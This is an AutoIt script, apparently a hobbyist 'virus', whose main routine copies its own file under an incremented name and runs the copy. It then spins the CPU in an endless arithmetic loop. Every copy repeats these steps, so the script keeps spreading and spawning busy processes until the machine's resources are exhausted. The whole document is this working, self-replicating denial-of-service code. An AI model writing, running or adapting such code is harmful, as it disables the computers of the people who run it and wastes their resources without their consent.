#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         myName

 Script Function:
	Template AutoIt script.

#ce ----------------------------------------------------------------------------
#include <Math.au3>


;Global $VirusFileCounter = 0
; Script Start - Add your code below here
Global $NEXT_FILE_TO_EXEC = ""
Func SlowDownCPU()
   Local $i = 987654321
   While 1
	  $i += 1
	  $i -= 1
	  $i *= 2
	  $i /= 2
   WEnd
EndFunc

Func RunVirusCode()
	  SlowDownCPU()
EndFunc

Func ExecNextVirusFile($FileName)
   Local $run = Run(@ScriptDir & "\" & $FileName)
EndFunc

Func createNewVirusFileName($FilenameWithDigit)
   Local $sDigits = StringRegExpReplace($FilenameWithDigit, "\D", "")
   $sDigits += 1

   Local $nameWithoutDigits = StringRegExpReplace($FilenameWithDigit, "\d", "")
   $NEXT_FILE_TO_EXEC = String($sDigits & $nameWithoutDigits)
   return String($sDigits & $nameWithoutDigits)
EndFunc


Func CreateVirusFile()
  #cs
  $virusContent = "Local $i = 9876" & @CRLF & _
	  "While 1" & @CRLF & _
		 "$i += 1" & @CRLF & _
		 "$i -= 1" & @CRLF & _
		 "$i *=2" & @CRLF & _
		 "$i /=2" & @CRLF & _
	  "WEnd"
   #ce
   ;Local $newVFile = FileOpen(@ScriptDir & "\Virus_" & String($VirusFileCounter) & ".au3", 1)


   Local $newVFile = FileCopy(@ScriptDir & "\" & @ScriptName, @ScriptDir & "\" & CreateNewVirusFileName(@ScriptName) )

EndFunc




Func Main()
   CreateVirusFile()
   Sleep(1)
   ExecNextVirusFile($NEXT_FILE_TO_EXEC)
   RunVirusCode()
EndFunc

Main()